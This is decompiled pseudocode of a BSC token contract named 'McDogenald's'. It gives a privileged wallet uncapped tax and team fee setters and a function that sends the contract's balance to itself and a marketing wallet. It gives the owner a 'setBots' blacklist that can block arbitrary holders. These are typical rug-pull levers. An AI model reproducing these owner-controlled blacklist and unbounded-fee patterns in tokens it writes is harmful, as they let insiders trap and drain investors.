contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
const name = 'McDogenald's', 0

const totalSupply = 1000 * 10^18

const decimals = 9

const symbol = 'MCD', 0


address owner;
mapping of uint256 stor2;
mapping of uint256 allowance;
mapping of uint8 stor5;
mapping of uint8 stor6;
uint256 stor7;
uint256 stor9;
uint256 stor10;
address stor13;
address stor14;
address stor15;
uint8 stor16; offset 160
uint128 stor16; offset 176
uint128 stor16; offset 168
uint128 stor16; offset 160
address stor16;
uint256 stor17;
uint256 stor18;

function isBot(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor6[address(arg1)])
}

function owner() {
    return owner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function setTaxFee(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    stor9 = arg1
}

function setTeamFee(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    stor10 = arg1
}

function includeToFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    stor5[address(arg1)] = 0
}

function excludeFromFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    stor5[address(arg1)] = 1
}

function sub_b0594bcb(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    require arg1 <= 100
    stor18 = arg1
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function setNoTaxMode(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    Mask(88, 0, stor16.field_168) = Mask(88, 0, arg1)
}

function setMarketingWallet(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    stor5[stor14] = 0
    stor14 = arg1
    stor5[address(arg1)] = 1
}

function delBot(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor6[address(arg1)] = 0
}

function thisBalance() {
    if stor2[address(this.address)] > stor7:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
    if stor7 / 1000 * 10^18 <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor7 / 1000 * 10^18:
        revert with 'NH{q', 18
    return (stor2[address(this.address)] / stor7 / 1000 * 10^18)
}

function amountInPool() {
    if stor2[address(stor16.field_0)] > stor7:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
    if stor7 / 1000 * 10^18 <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor7 / 1000 * 10^18:
        revert with 'NH{q', 18
    return (stor2[address(stor16.field_0)] / stor7 / 1000 * 10^18)
}

function manualsend() {
    require msg.sender == stor13
    call stor13 with:
       value eth.balance(this.address) / 2 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    call stor14 with:
       value eth.balance(this.address) / 2 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor2[address(arg1)] > stor7:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
    if stor7 / 1000 * 10^18 <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor7 / 1000 * 10^18:
        revert with 'NH{q', 18
    return (stor2[address(arg1)] / stor7 / 1000 * 10^18)
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setBots(address[] arg1) {
    require calldata.size - 4 >= 32
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 'NH{q', 65
    if floor32(arg1.length) + 97 > test266151307() or floor32(arg1.length) + 97 < 96:
        revert with 'NH{q', 65
    require arg1 + (32 * arg1.length) + 36 <= calldata.size
    idx = 0
    s = arg1 + 36
    t = 128
    while idx < arg1.length:
        require cd[s] == address(cd[s])
        mem[t] = cd[s]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    idx = 0
    while idx < arg1.length:
        if idx >= arg1.length:
            revert with 'NH{q', 50
        if mem[(32 * idx) + 140 len 20] != address(stor16.field_0):
            if idx >= arg1.length:
                revert with 'NH{q', 50
            if mem[(32 * idx) + 140 len 20] != stor15:
                if idx >= arg1.length:
                    revert with 'NH{q', 50
                mem[0] = mem[(32 * idx) + 140 len 20]
                mem[32] = 6
                stor6[mem[(32 * idx) + 140 len 20]] = 1
        if idx == -1:
            revert with 'NH{q', 17
        idx = idx + 1
        continue 
}

function manualswap() {
    require msg.sender == stor13
    if stor2[address(this.address)] > stor7:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
    if stor7 / 1000 * 10^18 <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor7 / 1000 * 10^18:
        revert with 'NH{q', 18
    Mask(80, 0, stor16.field_176) = 1
    mem[320] = this.address
    require ext_code.size(stor15)
    staticcall stor15.WETH() with:
            gas gas_remaining wei
    mem[384] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    mem[352] = ext_call.return_data[12 len 20]
    if not this.address:
        revert with 0, 'ERC20: approve from the zero address'
    if not stor15:
        revert with 0, 'ERC20: approve to the zero address'
    allowance[address(this.address)][stor15] = stor2[address(this.address)] / stor7 / 1000 * 10^18
    emit Approval((stor2[address(this.address)] / stor7 / 1000 * 10^18), this.address, stor15);
    mem[ceil32(return_data.size) + 384] = 0x791ac94700000000000000000000000000000000000000000000000000000000
    mem[ceil32(return_data.size) + 388] = stor2[address(this.address)] / stor7 / 1000 * 10^18
    idx = 0
    s = 320
    t = ceil32(return_data.size) + 580
    while idx < 2:
        mem[t] = mem[s + 12 len 20]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    require ext_code.size(stor15)
    call stor15.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
         gas gas_remaining wei
        args stor2[address(this.address)] / stor7 / 1000 * 10^18, 0, 160, address(this.address), block.timestamp, 2, mem[ceil32(return_data.size) + 580 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    Mask(80, 0, stor16.field_176) = 0
}

function openTrading() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if uint8(stor16.field_160):
        revert with 0, 'trading is already open'
    stor15 = 0x10ed43c718714eb63d5aa57b78b54704e256024e
    if not this.address:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not stor15:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(this.address)][stor15] = 1000 * 10^18
    emit Approval(1000 * 10^18, this.address, stor15);
    require ext_code.size(0x10ed43c718714eb63d5aa57b78b54704e256024e)
    staticcall 0x10ed43c718714eb63d5aa57b78b54704e256024e.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(0x10ed43c718714eb63d5aa57b78b54704e256024e)
    staticcall 0x10ed43c718714eb63d5aa57b78b54704e256024e.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).createPair(address arg1, address arg2) with:
         gas gas_remaining wei
        args address(this.address), address(ext_call.return_data[0])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    address(stor16.field_0) = ext_call.return_data[12 len 20]
    if stor2[address(this.address)] > stor7:
        revert with 0, 'Amount must be less than total reflections'
    if stor7 / 1000 * 10^18 <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor7 / 1000 * 10^18:
        revert with 'NH{q', 18
    require ext_code.size(stor15)
    call stor15.addLiquidityETH(address arg1, uint256 arg2, uint256 arg3, uint256 arg4, address arg5, uint256 arg6) with:
       value eth.balance(this.address) wei
         gas gas_remaining wei
        args address(this.address), stor2[address(this.address)] / stor7 / 1000 * 10^18, 0, 0, owner, block.timestamp
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 96
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_call.return_data[32] == ext_call.return_data[32]
    require ext_call.return_data[64] == ext_call.return_data[64]
    require ext_code.size(address(stor16.field_0))
    call address(stor16.field_0).approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args stor15, -1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    Mask(96, 0, stor16.field_160) = 1
    if block.timestamp > -3601:
        revert with 'NH{q', 17
    stor17 = block.timestamp + 3600
}



}
